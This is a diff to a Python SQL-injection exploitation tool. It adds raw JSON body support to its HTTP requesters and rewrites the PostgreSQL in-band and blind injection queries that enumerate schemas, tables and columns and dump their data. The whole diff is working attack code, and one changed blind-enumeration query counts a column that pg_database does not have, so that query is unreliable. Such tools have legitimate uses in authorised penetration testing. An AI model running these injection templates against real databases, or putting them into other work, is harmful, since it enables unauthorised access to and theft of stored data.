@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-# Copyright (C) 2015 Sebastien MACKE
+# Copyright (C) Sebastien MACKE
 #
 # This program is free software; you can redistribute it and/or modify it under
 # the terms of the GNU General Public License version 2, as published by the
@@ -42,15 +42,12 @@ from time import localtime, strftime, sleep, time
 from threading import Thread
 from urllib.parse import urlparse, urlunparse, parse_qsl, urlencode
 from string import Template
-from collections import OrderedDict
 import sys
 
 missing = []
 try:
   import requests
-  from requests.auth import HTTPBasicAuth
-  from requests.packages.urllib3.exceptions import InsecureRequestWarning
-  requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+  requests.packages.urllib3.disable_warnings()
 except ImportError:
   missing.append('requests')
 
@@ -70,7 +67,10 @@ def T(s, **kwargs):
   return Template(s).safe_substitute(**kwargs)
 
 def inject(payload, d):
-  return OrderedDict((k, v.replace('${injection}', payload)) for k, v in d.items())
+  if isinstance(d, dict):
+    return dict((k, v.replace('${injection}', payload)) for k, v in d.items())
+  else:
+    return d.replace('${injection}', payload)
 
 class Timing:
   def __enter__(self):
@@ -89,11 +89,22 @@ class Requester_HTTP_Base(object):
       auth_type='basic', auth_creds='', proxies={}, ssl_cert='', tamper_payload=lambda x: x,
       accepted_cookies=[], allow_redirects=False):
 
-    self.scheme, self.host, self.path, self.params, self.query, self.fragment = urlparse(url)
+    scheme, host, path, params, query, fragment = urlparse(url)
+
+    self.scheme = scheme
+    self.host = host
+    self.path = path
+    self.params = params
+    self.query = dict(parse_qsl(query, True))
+    self.fragment = fragment
     self.method = method
-    self.query = OrderedDict(parse_qsl(self.query, True))
-    self.body = OrderedDict(parse_qsl(body, True))
-    self.headers = OrderedDict(h.split(': ', 1) for h in headers)
+
+    if body.startswith('{'): # hack for json / raw body
+      self.body = body
+    else:
+      self.body = dict(parse_qsl(body, True))
+
+    self.headers = dict(h.split(': ', 1) for h in headers)
     self.auth_type = auth_type
     self.auth_creds = auth_creds
     self.proxies = proxies
@@ -159,7 +170,8 @@ class Requester_HTTP_requests(Requester_HTTP_Base):
     headers = inject(payload, headers)
 
     if method.upper() == 'POST':
-      headers['Content-Type'] = 'application/x-www-form-urlencoded'
+      if isinstance(body, dict):
+        headers['Content-Type'] = 'application/x-www-form-urlencoded'
 
     url = urlunparse((scheme, host, path, params, None, fragment))
     response = self.session.request(url=url, method=method, headers=headers, params=query, data=body, **self.request_kwargs)
@@ -203,7 +215,7 @@ class Requester_HTTP_pycurl(Requester_HTTP_Base):
         fp.setopt(pycurl.HTTPAUTH, pycurl.HTTPAUTH_NTLM)
       else:
         raise NotImplementedError("Incorrect auth_type '%s'" % auth_type)
-    
+
     if ssl_cert:
       fp.setopt(pycurl.SSLCERT, ssl_cert)
 
@@ -242,8 +254,14 @@ class Requester_HTTP_pycurl(Requester_HTTP_Base):
     payload = self.tamper_payload(payload)
 
     headers = inject(payload, headers)
-    query = urlencode(inject(payload, query))
-    body = urlencode(inject(payload, body))
+    query = inject(payload, query)
+    body = inject(payload, body)
+
+    if isinstance(query, dict):
+      query = urlencode(query)
+
+    if isinstance(body, dict):
+      body = urlencode(body)
 
     method = method.upper()
     if method == 'GET':
@@ -260,7 +278,7 @@ class Requester_HTTP_pycurl(Requester_HTTP_Base):
       fp.setopt(pycurl.CUSTOMREQUEST, method)
 
     url = urlunparse((scheme, host, path, params, query, fragment))
-    
+
     fp.setopt(pycurl.URL, url)
     fp.setopt(pycurl.HTTPHEADER, ['%s: %s' % (k, v) for k, v in headers.items()])
     fp.perform()
@@ -316,7 +334,7 @@ class Method_Base(object):
 class Method_Inband(Method_Base):
 
   def __init__(self, make_requester, template, pager=1):
-    super(Method_Inband, self).__init__(make_requester, template)
+    super().__init__(make_requester, template)
     self.pager = pager
 
   def execute(self, query, start_offset, stop_offset):
@@ -343,7 +361,7 @@ class Method_error(Method_Inband):
 class Method_Blind(Method_Base):
 
   def __init__(self, make_requester, template, num_threads=7, rate_limit=0, confirm_char=True):
-    super(Method_Blind, self).__init__(make_requester, template)
+    super().__init__(make_requester, template)
 
     self.num_threads = num_threads
     self.rate_limit = rate_limit
@@ -359,7 +377,7 @@ class Method_Blind(Method_Base):
       t.start()
 
     start_index, stop_index, q = self.prepare(query, start_offset, stop_offset)
-      
+
     for row_index in range(start_index, stop_index):
       yield self.get_row(q, row_index)
 
@@ -390,7 +408,7 @@ class Method_Blind(Method_Base):
 
         except:
           mesg = '%s %s' % sys.exc_info()[:2]
-          logger.warn('try %d, caught: %s' % (try_count, mesg))
+          logger.warning('try %d, caught: %s' % (try_count, mesg))
           logger.exception(sys.exc_info()[1])
 
           sleep(try_count * 2)
@@ -427,7 +445,6 @@ class Method_bitwise(Method_Blind):
 
         _, state = self.get_state()
         if not state:
-          requester = self.make_requester()
           logger.debug('could not confirm char')
           continue
 
@@ -481,7 +498,6 @@ class Method_binary(Method_Blind):
 
         _, state = self.get_state()
         if not state:
-          requester = self.make_requester()
           logger.debug('could not confirm char')
           continue
 
@@ -554,7 +570,6 @@ class Method_regexp(Method_Blind):
 
         _, state = self.get_state()
         if not state:
-          requester = self.make_requester()
           logger.debug('could not confirm char')
           continue
 
@@ -579,7 +594,7 @@ class SQLi_Base:
 
   def exploit(self):
     from sys import argv
-    from optparse import OptionParser, OptionGroup
+    from optparse import OptionParser
 
     usage_str = """usage: %prog [options]
     $ %prog -q 'select 42'"""
@@ -668,11 +683,13 @@ class SQLi_Base:
 
     with Timing() as timing:
       logger.info('Starting %s at %s' % (__banner__, strftime('%Y-%m-%d %H:%M %Z', localtime())))
+
       try:
         for query in queries:
           logger.info('Executing: %s' % repr(query))
           for result in self.method.execute(query, start_offset=opts.start_offset, stop_offset=opts.stop_offset):
             yield result
+
       except KeyboardInterrupt:
         print()
 
@@ -759,7 +776,7 @@ class MySQL_Inband(SQLi_Base):
 
 # MySQL_Blind {{{
 class MySQL_Blind(SQLi_Base):
-  
+
   def banner(self):
     return 'SELECT VERSION()'
 
@@ -1133,7 +1150,7 @@ class Postgres_Inband(SQLi_Base):
     return '(SELECT CURRENT_USER X)a'
 
   def current_db(self):
-    return '(SELECT CURRENT_DATABASE() X)a'
+    return '(SELECT CURRENT_SCHEMA() X)a' # CURRENT_DATABASE()
 
   def hostname(self):
     return '(SELECT CONCAT_WS(CHR(58),inet_server_addr(),inet_server_port()) X)a'
@@ -1168,22 +1185,22 @@ class Postgres_Inband(SQLi_Base):
 
   def enum_tables(self, db):
     if db:
-      c = "(SELECT COUNT(*) X FROM pg_tables WHERE schemaname=CURRENT_SCHEMA() AND tableowner='%s')a" % db
-      q = "(SELECT tablename X FROM pg_tables WHERE schemaname=CURRENT_SCHEMA() AND tableowner='%s' LIMIT ${row_count} OFFSET ${row_pos})a" % db
+      c = "(SELECT COUNT(*) X FROM pg_tables WHERE schemaname='%s')a" % db
+      q = "(SELECT tablename X FROM pg_tables WHERE schemaname='%s' LIMIT ${row_count} OFFSET ${row_pos})a" % db
 
     else:
-      c = "(SELECT COUNT(*) X FROM pg_tables WHERE schemaname=CURRENT_SCHEMA())a"
-      q = "(SELECT CONCAT_WS(CHR(58),tableowner,tablename) X FROM pg_tables WHERE schemaname=CURRENT_SCHEMA() LIMIT ${row_count} OFFSET ${row_pos})a"
+      c = "(SELECT COUNT(*) X FROM pg_tables)a"
+      q = "(SELECT CONCAT_WS(CHR(58),schemaname,tablename) X FROM pg_tables LIMIT ${row_count} OFFSET ${row_pos})a"
     return c, q
 
   def enum_columns(self, db, table):
     if table:
-        c = "(SELECT COUNT(*) X FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND a.relname='%s')a" % table
-        q = "(SELECT CONCAT_WS(CHR(58),attname) X FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND a.relname='%s' LIMIT ${row_count} OFFSET ${row_pos})a" % table
+        c = "(SELECT COUNT(*) X FROM information_schema.columns WHERE table_name='%s')a" % table
+        q = "(SELECT CONCAT_WS(CHR(58),table_name,column_name) X FROM information_schema.columns WHERE table_name='%s' LIMIT ${row_count} OFFSET ${row_pos})a" % table
 
     else:
-      c = "(SELECT COUNT(*) X FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND nspname=CURRENT_SCHEMA())a"
-      q = "(SELECT CONCAT_WS(CHR(58),a.relname,attname) X FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND nspname=CURRENT_SCHEMA() LIMIT ${row_count} OFFSET ${row_pos})a"
+      c = "(SELECT COUNT(*) X FROM information_schema.columns)a"
+      q = "(SELECT CONCAT_WS(CHR(58),table_schema,table_name,column_name) X FROM information_schema.columns LIMIT ${row_count} OFFSET ${row_pos})a"
     return c, q
 
   def dump_table(self, db, table, cols):
@@ -1206,7 +1223,7 @@ class Postgres_Blind(SQLi_Base):
     return 'SELECT CURRENT_USER'
 
   def current_db(self):
-    return 'SELECT CURRENT_DATABASE()'
+    return 'SELECT CURRENT_SCHEMA()' # CURRENT_DATABASE()
 
   def hostname(self):
     return 'SELECT CONCAT_WS(CHR(58),inet_server_addr(),inet_server_port())'
@@ -1234,28 +1251,28 @@ class Postgres_Blind(SQLi_Base):
     return c, q
 
   def enum_dbs(self):
-    c = 'SELECT COUNT(*) FROM pg_database'
-    q = 'SELECT datname FROM pg_database LIMIT 1 OFFSET ${row_pos}'
+    c = 'SELECT COUNT(DISTINCT(schemaname)) FROM pg_database'
+    q = 'SELECT DISTINCT(schemaname) FROM pg_tables LIMIT 1 OFFSET ${row_pos}'
     return c, q
 
   def enum_tables(self, db):
     if db:
-      c = "SELECT COUNT(*) FROM pg_tables WHERE schemaname=CURRENT_SCHEMA() AND tableowner='%s'" % db
-      q = "SELECT tablename FROM pg_tables WHERE schemaname=CURRENT_SCHEMA() AND tableowner='%s' LIMIT 1 OFFSET ${row_pos}" % db
+      c = "SELECT COUNT(*) X FROM pg_tables WHERE schemaname='%s'" % db
+      q = "SELECT CONCAT_WS(CHR(58),tableowner,tablename) X FROM pg_tables WHERE schemaname='%s' LIMIT 1 OFFSET ${row_pos}" % db
 
     else:
-      c = "SELECT COUNT(*) FROM pg_tables WHERE schemaname=CURRENT_SCHEMA()"
-      q = "SELECT CONCAT_WS(CHR(58),tableowner,tablename) FROM pg_tables WHERE schemaname=CURRENT_SCHEMA() LIMIT 1 OFFSET ${row_pos}"
+      c = "SELECT COUNT(*) X FROM pg_tables WHERE schemaname=CURRENT_SCHEMA()"
+      q = "SELECT CONCAT_WS(CHR(58),tableowner,tablename) X FROM pg_tables WHERE schemaname=CURRENT_SCHEMA() LIMIT 1 OFFSET ${row_pos}"
     return c, q
 
   def enum_columns(self, db, table):
     if table:
-        c = "SELECT COUNT(*) FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND a.relname='%s'" % table
-        q = "SELECT CONCAT_WS(CHR(58),attname) FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND a.relname='%s' LIMIT 1 OFFSET ${row_pos}" % table
+        c = "SELECT COUNT(*) X FROM information_schema.columns WHERE table_name='%s'" % table
+        q = "SELECT CONCAT_WS(CHR(58),table_name,column_name) X FROM information_schema.columns WHERE table_name='%s' LIMIT 1 OFFSET ${row_pos}" % table
 
     else:
-      c = "SELECT COUNT(*) FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND nspname=CURRENT_SCHEMA()"
-      q = "SELECT CONCAT_WS(CHR(58),a.relname,attname) FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND nspname=CURRENT_SCHEMA() LIMIT 1 OFFSET ${row_pos}"
+      c = "SELECT COUNT(*) X FROM information_schema.columns"
+      q = "SELECT CONCAT_WS(CHR(58),table_schema,table_name,column_name) X FROM information_schema.columns LIMIT 1 OFFSET ${row_pos}"
     return c, q
 
   def dump_table(self, db, table, cols):
